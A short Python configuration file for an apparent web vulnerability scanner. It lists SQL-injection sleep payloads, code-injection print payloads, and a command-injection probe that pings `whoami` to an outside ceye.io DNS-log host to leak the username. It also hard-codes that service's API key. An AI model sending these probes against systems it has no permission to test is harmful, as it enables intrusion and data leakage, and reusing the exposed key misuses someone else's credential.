# coding=utf-8
# config file
# dict 格式存储

# sqli config

sqli_config = {
    "sleep_time": 5,

    "payload": [
        "'xor(sleep(%d))or'",
        "\"xor(sleep(%d))or\"",
        "1 xor(sleep(%d))or'",
        ",sleep(%d)",
    ],

    "scan_postion": ["get", "post"],
}


# code&command inject config

code_inject_config = {
    "payload": [
        "1 xor(print(%s*%s))",
        "'.(print(%s*%s)).'",
        "\".(print(%s*%s)).\"",
    ],

    "scan_position": ["get", "post", "cookie"],
}

command_inject_config = {
    "ceye_host": "mw5aad.ceye.io",
    "ceye_api": "46238220ecd975a96d946dd0c4c63fe4",

    "payload": ["$(ping `whoami`.%s.%s)"],

    "scan_position": ["get", "post", "cookie", "header"],
}